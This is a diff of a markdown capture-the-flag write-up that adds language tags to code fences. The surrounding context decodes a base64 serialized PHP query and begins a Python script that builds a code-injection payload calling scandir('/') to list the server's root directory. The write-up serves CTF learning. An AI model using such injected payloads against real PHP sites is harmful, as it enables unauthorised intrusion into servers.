@@ -11,7 +11,7 @@ As expected, 1 + 2 does equal to 3. The interesting part of this is the url.
 
 It has some sort of encrypted input query that I assumed is base64. Let's try to decode the input with this script.
 
-```
+```python
 import base64
 
 query = "YTozOntpOjA7czozOiJzdW0iO2k6MTtzOjE6IjEiO2k6MjtzOjE6IjIiO30="
@@ -33,7 +33,7 @@ s:3 # Size of this index's data
 
 Okay, that's very insightful. But, this is a web exploitation challenge. Let's look at the PHP of this website since this challenge is tagged PHP.
 
-```
+```php
 <?php
 function format_error($expre) {
     return "<p><b>Format error:</b> the input is given in wrong format!</p>";
@@ -113,7 +113,7 @@ Let's scan the root directory using the ```scandir()``` syntax.
 
 To make this easier, I created a python script to generate the url.
 
-```
+```python
 import base64
 
 payload = "echo join(', ', scandir('/'));"
